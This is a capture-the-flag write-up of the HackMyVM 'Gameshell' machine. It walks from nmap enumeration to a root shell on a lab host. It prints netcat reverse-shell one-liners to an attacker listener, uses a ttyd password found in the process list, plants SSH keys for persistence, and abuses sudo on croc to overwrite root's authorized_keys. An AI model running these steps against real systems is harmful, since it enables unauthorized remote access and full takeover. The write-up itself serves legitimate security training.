# GameShell-HMV: [Gameshell](https://hackmyvm.eu/machines/machine.php?vm=Gameshell)

---

## Overview

This write-up details the exploitation process of the Gameshell machine from HackMyVM. The target is a Linux system running several services, including SSH and web servers. The goal is to achieve root access by escalating privileges through various users.

---

## Enumeration

We start by scanning the target using a Python script called `hmv` which automates net discovery and nmap scans.

```zsh
┌──(cool㉿kali)-[~]
└─$ hmv gameshell
```

The nmap scan output reveals:

```
# Nmap 7.98 scan initiated Mon Dec 29 06:13:05 2025 as: /usr/lib/nmap/nmap --privileged -v -p- -sC -sV -T4 -oA /home/cool/HMV/gameshell/scans/nmap-gameshell-full -oN /home/cool/HMV/gameshell/scans/nmap-gameshell-full.log 192.168.56.102
Nmap scan report for gameshell.hmv (192.168.56.102)
Host is up (0.0077s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Bash // The Eternal Shell
7681/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-title: ttyd - Terminal
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:C9:6B:4A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Summary:

- SSH on port 22
- Apache HTTP server on port 80
- ttyd terminal web server on port 7681

---

## Initial Access

### Web Services Exploration

Visiting port 80 (`http://gameshell.hmv`) yields no significant information.

Port 7681 hosts a ttyd webshell. The banner displayed is:

```
  |                                                   |
--+---------------------------------------------------+--
  | Run the command                                   |
  |     $ gsh goal                                    |
  | to discover your first mission.                   |
  |                                                   |
  | You can check the mission has been completed with |
  |     $ gsh check                                   |
  |                                                   |
  | The command                                       |
  |     $ gsh help                                    |
  | displays the list of available (gsh) commands.    |
--+---------------------------------------------------+--
  |                                                   |
```

### Getting a Stable Shell

A direct netcat reverse shell attempt fails:

```zsh
nc 192.168.56.1 4444 -e /bin/bash
```

However, using BusyBox's netcat works perfectly:

```zsh
busybox nc 192.168.56.1 4444 -e /bin/bash
```

On your local machine, start a listener with:

```zsh
rsg 192.168.56.1 4444 bash
```

On the webshell, run:

```zsh
busybox nc 192.168.56.1 4444 -e /bin/bash
```

---

## Shell Upgrade

To improve the shell's interactivity and usability, run the following commands on the reverse shell:

```zsh
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
reset
export TERM=xterm-256color
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
alias ll='ls -lsaht --color=auto'
alias ls='ls -lah --color=auto'
stty rows 59 columns 236
source /etc/skel/.bashrc
```

Example session:

```zsh
└─$ rsg 192.168.56.1 4444 bash
[mission 1] $ export TERM=xterm-256color
[mission 1] $ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
[mission 1] $ alias ll='ls -lsaht --color=auto'
[mission 1] $ alias ls='ls -lah --color=auto'
[mission 1] $ stty rows 59 columns 236
[mission 1] $ 
source /etc/skel/.bashrc
www-data@GameShell:~$ 
```

---

## Privilege Escalation (www-data → eviden)

### Discovering Users

Listing the `/home` directory shows two users:

```zsh
www-data@GameShell:~$ ls /home
eviden  silo
```

Checking running processes for these users:

```zsh
www-data@GameShell:~$ ps aux | grep silo
www-data   12507  0.0  0.0   6176   704 pts/4    S+   07:33   0:00 grep silo
```

No processes found for `silo`.

For `eviden`:

```zsh
www-data@GameShell:~$ ps aux | grep eviden
eviden       355  0.0  0.0   1568  1156 ?        Ss   06:12   0:00 /usr/local/bin/ttyd -i 127.0.0.1 -p 9876 -c admin:nimda -W bash
www-data   12510  0.0  0.0   6176   704 pts/4    S+   07:34   0:00 grep eviden
```

This indicates a local server running as user `eviden` on port 9876 with credentials `admin:nimda`.

### SSH Reverse Tunnel for Local Access

To access the ttyd server remotely, create an SSH reverse tunnel:

```zsh
ssh -R 8888:localhost:9876 cool@192.168.56.1
```

This command forwards port 9876 on the target to port 8888 on your local machine. You can then access the ttyd terminal by visiting `http://localhost:8888` in your browser.

Use the credentials found (`admin:nimda`) to log in.

### Accessing eviden's Home

Once inside:

```zsh
eviden@GameShell:~$ cd ; pwd
/home/eviden
```

### Setting up SSH Key Authentication

For easier access, set up SSH keys for the `eviden` user:

```zsh
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA... your_public_key_here ...' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

---

## Privilege Escalation (eviden → root)

### Checking sudo Privileges

On the `eviden` user, check allowed sudo commands:

```zsh
eviden@GameShell:~$ sudo -l
Matching Defaults entries for eviden on GameShell:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eviden may run the following commands on GameShell:
    (ALL) NOPASSWD: /usr/local/bin/croc
```

`eviden` has passwordless sudo access to `/usr/local/bin/croc`.

### Understanding croc

[CROC](https://github.com/schollz/croc) is a tool to securely transfer files between machines:

```zsh
sudo /usr/local/bin/croc --help
NAME:
   croc - easily and securely transfer stuff from one computer to another

USAGE:
   croc [GLOBAL OPTIONS] [COMMAND] [COMMAND OPTIONS] [filename(s) or folder]

   USAGE EXAMPLES:
   Send a file:
      croc send file.txt
```

### Transferring SSH Key to Root

On your local machine, prepare your SSH public key for transfer:

```zsh
cd ~/.ssh
cat id_rsa_kali.pub >> authorized_keys
```

Send the `authorized_keys` file to the target using `croc`:

```zsh
croc send authorized_keys
```

Example output:

```
Sending 'authorized_keys' (268 B)
Code is: 2632-detail-tripod-ladder

On the other computer run:
(For Windows)
    croc 2632-detail-tripod-ladder
(For Linux/macOS)
    CROC_SECRET="2632-detail-tripod-ladder" croc 

Sending (->192.168.56.102:33102)
authorized_keys 100% |████████████████████| (268/268 B, 356 kB/s)
```

On the target machine, receive the file with sudo:

```zsh
eviden@GameShell:~$ sudo /usr/local/bin/croc --yes --out /root/.ssh
Enter receive code: 2632-detail-tripod-ladder
Receiving 'authorized_keys' (268 B) 

Receiving (<-192.168.56.1:9009)

Overwrite 'authorized_keys'? (y/N) (use --overwrite to omit) y 
 authorized_keys 100% |████████████████████| (268/268 B, 67 kB/s)
```

### SSH as Root

Back on your local machine, connect as root using your private key:

```zsh
ssh root@192.168.56.102 -i id_rsa_kali
```

Example session:

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux GameShell 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Dec 29 06:54:26 2025 from 192.168.56.1
root@GameShell:~# 
```

---

## Flags

*(No flag information provided in the original document.)*

---

# Summary

- Enumerated open services and discovered a ttyd webshell.
- Obtained a stable reverse shell using BusyBox netcat.
- Upgraded the shell for better interactivity.
- Discovered a local ttyd server running as user `eviden`.
- Established an SSH reverse tunnel to access the local ttyd server.
- Set up SSH key authentication for `eviden`.
- Leveraged passwordless sudo on `croc` to transfer SSH keys to root.
- Logged in as root using SSH with the transferred key.

This process demonstrates careful enumeration, pivoting through users, and leveraging allowed sudo commands to escalate privileges to root.